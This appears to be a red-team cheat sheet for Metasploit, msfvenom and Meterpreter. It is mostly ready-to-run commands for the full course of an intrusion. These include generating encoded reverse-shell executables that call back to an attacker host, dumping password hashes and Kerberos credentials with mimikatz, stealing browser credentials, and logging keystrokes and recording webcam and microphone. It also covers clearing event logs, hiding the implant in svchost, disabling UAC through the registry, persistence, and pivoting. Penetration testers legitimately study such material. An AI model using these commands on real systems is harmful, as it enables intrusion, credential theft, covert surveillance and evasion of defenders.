# Metasploit

### Port Scan

```
use auxiliary/scanner/portscan/
tcp
set RHOSTS 10.10.10.0/24
run
```

### DNS Enumeration

```
use auxiliary/gather/dns_enum
set DOMAIN target.tgt
run
```

### Host FTP Server

```
use auxiliary/server/ftp
set FTPROOT /tmp/ftproot
run
```

### Proxy Server

* Any proxied traffic that matches the subnet of a route will be routed through the session specified by route.&#x20;
* Use proxychains configured for socks4 to route any application's traffic through a Meterpreter session.

```
#comprimised host has 10.10.120.20 ip want to proxy traffic through meterpreter
route add 10.10.120.0/24 4
use auxiliary/server/socks_proxy
set Version 4a
set SRVPORT 9050
run
```

## msfvenom

* The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode them.

### List Payloads&#x20;

```
msfvenom -l payloads
```

### Basic Examples

```
msfvenom -p windows/meterpreter/
reverse_tcp -f exe LHOST=10.1.1.1
LPORT=4444 > met.exe
```

### Format Options

```
--help-formats #List available output formats
exe #Executable 
pl #Perl
rb #Ruby
raw #Raw Shellcode
c #C Code
```

### Encoders&#x20;

* See all encoders&#x20;

```
msfvenom -l encoders
```

* Basic Example:

```
msfvenom -p windows/meterpreter/
reverse_tcp -i 5 -e x86/shikata_ga_nai -f
exe LHOST=10.1.1.1 LPORT=4444 > mal.exe
```

## Meterpreter

* Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used.
* Remember to check all available commands running the help command once a Meterpreter session has started.

### Post Exploitation Modules Reference

* https://www.offensive-security.com/metasploit-unleashed/post-module-reference/

### Core commands

* `background`: Backgrounds the current session
* `exit`: Terminate the Meterpreter session
* `guid`: Get the session GUID (Globally Unique Identifier)
* `help`: Displays the help menu
* `info`: Displays information about a Post module
* `irb`: Opens an interactive Ruby shell on the current session
* `load`: Loads one or more Meterpreter extensions
* `migrate`: Allows you to migrate Meterpreter to another process
* `run`: Executes a Meterpreter script or Post module
* `sessions`: Quickly switch to another session

### File system commands

* `cd`: Will change directory
* `ls`: Will list files in the current directory (dir will also work)
* `pwd`: Prints the current working directory
* `edit`: will allow you to edit a file
* `cat`: Will show the contents of a file to the screen
* `rm`: Will delete the specified file
* `search`: Will search for files
* `upload`: Will upload a file or directory
* `download`: Will download a file or directory

### Networking commands

* `arp`: Displays the host ARP (Address Resolution Protocol) cache
* `ifconfig`: Displays network interfaces available on the target system
* `netstat`: Displays the network connections
* `portfwd`: Forwards a local port to a remote service
* `route`: Allows you to view and modify the routing table

### System commands

* `clearev`: Clears the event logs
* `execute`: Executes a command
* `getpid`: Shows the current process identifier
* `getuid`: Shows the user that Meterpreter is running as
* `kill`: Terminates a process
* `pkill`: Terminates processes by name
* `ps`: Lists running processes
* `reboot`: Reboots the remote computer
* `shell`: Drops into a system command shell
* `shutdown`: Shuts down the remote computer
* `sysinfo`: Gets information about the remote system, such as OS

### Others Commands (these will be listed under different menu categories in the help menu)

* `idletime`: Returns the number of seconds the remote user has been idle
* `keyscan_dump`: Dumps the keystroke buffer
* `keyscan_start`: Starts capturing keystrokes
* `keyscan_stop`: Stops capturing keystrokes
* `screenshare`: Allows you to watch the remote user's desktop in real time
* `screenshot`: Grabs a screenshot of the interactive desktop
* `record_mic`: Records audio from the default microphone for X seconds
* `webcam_chat`: Starts a video chat
* `webcam_list`: Lists webcams
* `webcam_snap`: Takes a snapshot from the specified webcam
* `webcam_stream`: Plays a video stream from the specified webcam
* `getsystem`: Attempts to elevate your privilege to that of local system
* `hashdump`: Dumps the contents of the SAM database

### Modules

### Kiwi Commands

```
Command                Description
-------                -----------
creds_all              Retrieve all credentials (parsed)
creds_kerberos         Retrieve Kerberos creds (parsed)
creds_msv              Retrieve LM/NTLM creds (parsed)
creds_ssp              Retrieve SSP creds
creds_tspkg            Retrieve TsPkg creds (parsed)
creds_wdigest          Retrieve WDigest creds (parsed)
dcsync                 Retrieve user account information via DCSync (unparsed)
dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
golden_ticket_create   Create a golden kerberos ticket
kerberos_ticket_list   List all kerberos tickets (unparsed)
kerberos_ticket_purge  Purge any in-use kerberos tickets
kerberos_ticket_use    Use a kerberos ticket
kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
lsa_dump_sam           Dump LSA SAM (unparsed)
lsa_dump_secrets       Dump LSA secrets (unparsed)
password_change        Change the password/hash of a user
wifi_list              List wifi profiles/creds for the current user
wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```

* Although all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment.

### New Meterpreter Session Steps

* Assuming you gained access, inserted AV Path Exception, wrote implant to disk and executed to catch you callback

```
getuid #see your user context
getpid #identify pid you are running as (should be the pid of your msfvenom implant named whatever you assigned)
getprivs #see enabled process privileges
ps #view the whole process list and pick and svchost process within the same user context, get its pid number
migrate XXXX #to the pid of the svchost process 
getpid #confirm new pid
ps #ensure it is of the correct process 
del /path/to/implant #remove implant artifact from disk 
```

* Now you are set up and running as a thread in the address space of the `svchost.exe` process

### Accessing the Filesystem&#x20;

* Common commands include&#x20;
* **cd** - change directory on the target
* **cat** - read and output to stdout the contents of a file
* **del** - delete a file on the target
* **edit** - edit a file with vim
* **ls** - list files in current directory
* **mkdir** - make a directory on the target system
* **rmdir** - remove directory on the target system

### File collect with meterpreter

* `download` and `upload` commands
* Ensure you are escaping the windows ""
* Example:

```
download C:\\Users\\Administrator\\Desktop\\secret.txt
```

### Harvest Credentials&#x20;

* One way to try and harvest come credentials is with the hashdump module&#x20;

```
run post/windows/gather/hashdump
```

* The output of each line is in the following format: `Username:SID:LM hash:NTLM hash:::`
* Note that the [LM](https://en.wikipedia.org/wiki/LAN\_Manager) hash `aad3b435b51404eeaad3b435b51404ee` corresponds to an empty password as well as the [NTLM](https://en.wikipedia.org/wiki/NT\_LAN\_Manager) hash `31d6cfe0d16ae931b73c59d7e0c089c0`.
* another method that can yeild more credentials (especially on the domain controller) is:

```
run post/windows/gather/credentials/credential_collector 
```

### Execute a program <a href="#executeaprogram" id="executeaprogram"></a>

* The `execute` command allows us to start remote processes&#x20;
* `execute` flags
* **-H** Create the process hidden from view
* **-a** Arguments to pass to the command
* **-i** Interact with the process after creating it
* **-m** Execute from memory
* **-t** Execute process with currently impersonated thread token
* **-s** Execute process in a given session as the session user
* Regarding the last option `-s`, we can find out the available sessions by using the `enumdesktops`-command. The following example does that and then executes _calc.exe_ on session 1:

```
enumdesktops 
Desktops
--------
    Session  Station Name
    1        WinSta0 Default
    1        WinSta0 Winlogon
meterpreter> execute -s 1 -f calc.exe
```

### Post Modules for Windows Survey

```
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/checkvm 
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/credentials/credential_collector 
**ENSURE SYSTEM before running
-----------------------------------------------------------------------
**ENSURE you migrate to a user process before running dumplinks**
meterpreter > run post/windows/manage/migrate 
meterpreter > run post/windows/gather/dumplinks 
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/enum_applications 
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/enum_logged_on_users 
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/enum_shares 
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/enum_snmp
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/hashdump
**ENSURE SYSTEM before running 
-----------------------------------------------------------------------
meterpreter > run post/windows/gather/usb_history 
-----------------------------------------------------------------------
msf > use post/multi/recon/local_exploit_suggester
set SESSION X
SHOWDESCRIPTION true
-----------------------------------------------------------------------
msf > use post/recon/outbound_ports
```

### Winenum Windows Built In enumeration Script

* from your meterpreter prompt:

```
meterpreter> run winenum
```

* This will use net, netsh, and wmic commands to enumerate the target machine.
* Note: Each individual command in this script will have its output stored in the path output in the line starting with 'Output of each individual command is saved to '.

### Clearing the Event Log

* from a meterpreter prompt

```
meterpreter> clearev
```

### Meterpreter Extensions

### **kiwi module**&#x20;

```
load kiwi
help kiwi
```

### Powershell Extension

```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > 
```

### **Powershell Commands from Meterpreter**

* run a powershell command as a "oneshot" from a meterpreter shell

```
execute -if powershell.exe -a "dir"
execute -if powershell.exe -a "net group"
execute -if powershell.exe -a 'net user /domain'
```

### **Metasploit imperssonate**

```
Load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
```

### **Upgrade shell to meterpreter**

```
use multi/manage/shell_to_meterpreter
set SESSION
set LHOST
set LPORT
run
```

### Firefox Post Exploitation&#x20;

```
use post/multi/gather/firefox_creds
```

* can be run as non Administrator or as Admin, registry information gets pulled as Admin

### Routing

### **Set route**

```
route add <subnet / host ip> <subnetmask> <session id>
```

### **Autoroute module**

```
use multi/manage/autoroute
```

### **Run autoroute**

```
run autoroute -s 10.100.11.0/24
```

### **Create port forward**

```
Portfwd add -l <LOCAL PORT> -p <REMOTE PORT> -r <REMOTE HOST>
```

### UAC Escalation

```
use exploit windows/local/bypassuac_windows_store_reg
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 8080
set SESSION 2
run
```

### Change UAC to not Notify

* Need to be admin

```
#check registry key first 
Get-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
#look for:
ConsentPromptBehaviorAdmin
ConsentPromptBehaviorUser
#Change if it is set to 1 or 2
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
```

### Disable LUA

* EnableLUA specifies whether Windows User Account Controls (UAC) notifies the user when programs try to make changes to the computer. UAC was formerly known as Limited User Account (LUA).

```
#check registry key first 
Get-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
#look for:
EnableLUA   1
#now set to 0 
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0
#will need to restart before changes are applied, thus ensure WMI Event Subscription Persistance or Registry is set up first
```

### Persistance Modules

* Registry Run Key

```
use exploit/windows/registry/local/registry_persistence
```

* Ensure to set the `RUN_NAME` at a minimum
* WMI Event Subscription Persistance

```
use exploit/windows/local/wmi_persistence
```

* Ensure failed login auditing is enabled on target
* To enable:

```
auditpol.exe /set /subcategory:Logon /failure:Enable
```

* Event ID for a failed logon is `4625`
* Ensure to set the `USERNAME_TRIGGER` and `SESSION` at a minimum
* Cannot be run as SYSTEM or USER needs to be run with ADMINISTRATOR
